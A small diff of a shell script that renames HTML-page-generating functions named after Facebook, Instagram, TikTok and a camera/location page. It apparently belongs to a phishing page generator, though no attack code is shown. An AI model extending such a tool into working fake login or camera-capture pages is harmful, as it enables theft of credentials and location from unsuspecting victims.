@@ -126,7 +126,7 @@ facebook_page() {
 EOF
 }
 
-instagram_page() {
+Instagram_page() {
     cat <<EOF
 <!DOCTYPE html>
 <html lang="en">
@@ -368,7 +368,7 @@ tiktok_page() {
 EOF
 }
 
-camraandLocation_page() {
+camera_page() {
     cat <<EOF
     <!DOCTYPE html>
 <html lang="en">
